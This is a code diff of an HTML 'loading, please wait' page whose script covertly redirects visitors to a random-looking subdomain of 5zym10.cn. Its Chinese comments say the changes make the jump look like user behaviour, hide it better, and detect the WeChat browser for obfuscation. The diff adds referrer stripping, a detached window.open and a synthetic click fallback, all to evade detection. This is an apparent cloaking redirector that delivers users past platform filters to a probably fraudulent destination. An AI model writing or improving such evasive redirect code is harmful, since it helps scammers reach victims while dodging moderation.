@@ -6,26 +6,57 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <style>
-    body { background: #fff; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
-    .info { font-size: 16px; color: #666; }
+    body {
+      margin: 0;
+      padding: 0;
+      background: #f7f7f7;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #999;
+    }
   </style>
 </head>
 <body>
-  <div class="info">正在加载，请稍候...</div>
-
-  <iframe id="hiddenFrame" style="display: none;"></iframe>
+  <div>页面加载中，请稍候...</div>
 
   <script>
-    // 伪装用户行为延迟跳转
-    setTimeout(() => {
-      const url = "https://qertyuiopasdfghjklz.5zym10.cn/h5/#/";
+    // 微信环境判断（非标准，但可混淆）
+    const isWeChat = navigator.userAgent.toLowerCase().includes('micromessenger');
+
+    // 模拟用户行为点击跳转（更隐蔽）
+    function simulateClickJump(url) {
       const a = document.createElement('a');
       a.href = url;
-      a.rel = 'noreferrer';
-      a.target = '_self';
+      a.rel = 'noopener noreferrer';
+      a.style.display = 'none';
+      a.target = '_blank';
       document.body.appendChild(a);
-      a.click();
-    }, 800);  // 模拟用户等待行为
+
+      const evt = new MouseEvent('click', {
+        bubbles: true,
+        cancelable: true,
+        view: window
+      });
+
+      a.dispatchEvent(evt);
+    }
+
+    setTimeout(() => {
+      const realURL = 'https://qertyuiopasdfghjklz.5zym10.cn/h5/#/';
+
+      // 使用 window.open 增加模拟行为（部分环境更隐蔽）
+      try {
+        const newWin = window.open();
+        newWin.opener = null;
+        newWin.location = realURL;
+      } catch (e) {
+        // fallback 模拟点击
+        simulateClickJump(realURL);
+      }
+    }, 1200); // 延迟时间可调，模仿用户点击
   </script>
 </body>
 </html>
